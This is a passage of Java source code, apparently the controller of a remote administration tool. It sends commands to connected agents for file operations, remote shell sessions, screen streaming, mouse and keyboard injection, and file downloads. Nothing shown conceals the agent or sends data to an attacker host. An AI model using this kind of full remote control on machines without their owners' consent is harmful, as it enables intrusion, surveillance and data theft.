        JSONObject msg = payload != null ? new JSONObject(payload.toString()) : new JSONObject();
        msg.put("cmd", cmd);
        sendMessage(device, msg.toString());
    }

    public interface ScreenStreamListener {
        void onStarted(RemoteDevice device, String sessionId, int width, int height);
        void onFrame(RemoteDevice device, String sessionId, BufferedImage frame);
        void onError(RemoteDevice device, String sessionId, String error);
    }
    private ScreenStreamListener screenStreamListener;
    public void setScreenStreamListener(ScreenStreamListener listener) {
        this.screenStreamListener = listener;
    }
    private long computeFolderSize(File folder) throws IOException {
        return Files.walk(folder.toPath())
                    .filter(Files::isRegularFile)
                    .mapToLong(p -> p.toFile().length())
                    .sum();
    }

    public void sendDelete(RemoteDevice device, String path) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "fs:delete");
        msg.put("path", path);
        sendMessage(device, msg.toString());
    }

    public void sendRename(RemoteDevice device, String from, String to) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "fs:rename");
        msg.put("from", from);
        msg.put("to", to);
        sendMessage(device, msg.toString());
    }

    public void sendFind(RemoteDevice device, String basePath, String query) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "fs:find");
        msg.put("path", basePath);
        msg.put("query", query);
        sendMessage(device, msg.toString());
    }

    public void sendShellCommand(RemoteDevice device, String command) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "shell");
        msg.put("command", command);
        sendMessage(device, msg.toString());
    }

    public void sendReadFile(RemoteDevice device, String path) {
        String transferId = UUID.randomUUID().toString();
        pendingFileReads.put(transferId, path);
        JSONObject msg = new JSONObject();
        msg.put("cmd", "fs:read_file");
        msg.put("path", path);
        msg.put("transferId", transferId);
        sendMessage(device, msg.toString());
    }

    public void sendZip(RemoteDevice device, String sourcePath, String destPath) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "fs:zip");
        msg.put("path", sourcePath);
        msg.put("dest", destPath);
        sendMessage(device, msg.toString());
    }

    public void sendExtract(RemoteDevice device, String zipPath, String destDir) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "fs:extract");
        msg.put("path", zipPath);
        msg.put("dest", destDir);
        sendMessage(device, msg.toString());
    }

    /** Start a persistent shell on the remote device. Returns the session ID immediately. */
    public String startShellSession(RemoteDevice device) {
        String sessionId = UUID.randomUUID().toString();
        activeShellSessions.put(device.socket, sessionId);
        JSONObject msg = new JSONObject();
        msg.put("cmd", "shell:start");
        msg.put("sessionId", sessionId);
        sendMessage(device, msg.toString());
        return sessionId;
    }

    /** Send a line of input to the running shell. */
    public void sendShellInput(RemoteDevice device, String sessionId, String input) {
        JSONObject msg = new JSONObject();
        msg.put("cmd", "shell:input");
        msg.put("sessionId", sessionId);
        msg.put("data", input);
        sendMessage(device, msg.toString());
    }

    // ── Screen capture session ────────────────────────────────────────────────

    /** Ask the remote agent to start streaming its screen. Returns the sessionId. */
    public String startScreenSession(RemoteDevice device, int quality, int fps) {
        String sessionId = UUID.randomUUID().toString();
        activeScreenSessions.put(device.socket, sessionId);
        JSONObject msg = new JSONObject();
        msg.put("cmd",       "screen:start");
        msg.put("sessionId", sessionId);
        msg.put("quality",   quality);
        msg.put("fps",       fps);
        sendMessage(device, msg.toString());
        return sessionId;
    }

    /** Tell the remote agent to stop the running screen-capture session. */
    public void stopScreenSession(RemoteDevice device) {
        String sessionId = activeScreenSessions.remove(device.socket);
        if (sessionId != null) {
            JSONObject msg = new JSONObject();
            msg.put("cmd",       "screen:stop");
            msg.put("sessionId", sessionId);
            sendMessage(device, msg.toString());
        }
    }

    // ── Robot input forwarders ────────────────────────────────────────────────

    public void sendMouseMove(RemoteDevice device, int x, int y) {
        JSONObject m = new JSONObject();
        m.put("cmd", "input:mouse_move");
        m.put("x", x); m.put("y", y);
        sendMessage(device, m.toString());
    }

    public void sendMousePress(RemoteDevice device, int x, int y, int buttonMask) {
        JSONObject m = new JSONObject();
        m.put("cmd", "input:mouse_press");
        m.put("x", x); m.put("y", y); m.put("button", buttonMask);
        sendMessage(device, m.toString());
    }

    public void sendMouseRelease(RemoteDevice device, int x, int y, int buttonMask) {
        JSONObject m = new JSONObject();
        m.put("cmd", "input:mouse_release");
        m.put("x", x); m.put("y", y); m.put("button", buttonMask);
        sendMessage(device, m.toString());
    }

    public void sendMouseScroll(RemoteDevice device, int amount) {
        JSONObject m = new JSONObject();
        m.put("cmd", "input:mouse_scroll");
        m.put("amount", amount);
        sendMessage(device, m.toString());
    }

    public void sendKeyPress(RemoteDevice device, int keyCode) {
        JSONObject m = new JSONObject();
        m.put("cmd", "input:key_press");
        m.put("keyCode", keyCode);
        sendMessage(device, m.toString());
    }

    public void sendKeyRelease(RemoteDevice device, int keyCode) {
        JSONObject m = new JSONObject();
        m.put("cmd", "input:key_release");
        m.put("keyCode", keyCode);
        sendMessage(device, m.toString());
    }

    /** Kill the persistent shell for this device. */
    public void stopShellSession(RemoteDevice device) {
        String sessionId = activeShellSessions.remove(device.socket);
        if (sessionId != null) {
            JSONObject msg = new JSONObject();
            msg.put("cmd", "shell:stop");
            msg.put("sessionId", sessionId);
            sendMessage(device, msg.toString());
        }
    }
    public void downloadFileOrFolder(RemoteDevice device, String remotePath, File localDir) {
        try {
            String transferId = UUID.randomUUID().toString();
            // local filename = basename(remotePath)
            String name = new File(remotePath).getName();
            File dest = new File(localDir, name);
            dest.getParentFile().mkdirs();
            // store destination on server-side keyed by transferId
            pendingDownloads.put(transferId, dest);
            JSONObject req = new JSONObject();
            req.put("cmd", "fs:download_start");
            req.put("path", remotePath);
            req.put("transferId", transferId);              // IMPORTANT
            // optional: include a suggested dest, but server trusts its own map
            req.put("dest", dest.getAbsolutePath());
            sendMessage(device, req.toString());
            System.out.println("Requested download transferId=" + transferId + " remote=" + remotePath + " -> local=" + dest);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



}
